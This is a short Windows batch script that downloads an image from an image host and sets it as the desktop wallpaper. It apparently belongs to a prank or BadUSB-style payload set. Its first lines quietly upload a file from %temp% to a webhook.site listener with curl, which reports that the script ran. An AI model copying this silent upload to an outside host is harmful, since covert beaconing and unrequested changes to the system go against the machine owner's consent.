echo THE WALLPAPAER CODE RAN SUCCESSFULLY :-) > %temp%\info.txt
curl -T "%temp%/info.txt" "https://webhook.site/3eddd305-811f-4430-83dc-4bad466db906"

@echo off
set "url=https://i.ibb.co/y6T1rgs/Wallpaper.png"
set "outputFile=%TEMP%\wallpaper.jpg"

REM Download the image from the web
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%outputFile%')"

REM Set the downloaded image as the wallpaper
powershell -Command "Set-ItemProperty -path 'HKCU:\Control Panel\Desktop' -name Wallpaper -value '%outputFile%'"
powershell -Command "RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters"

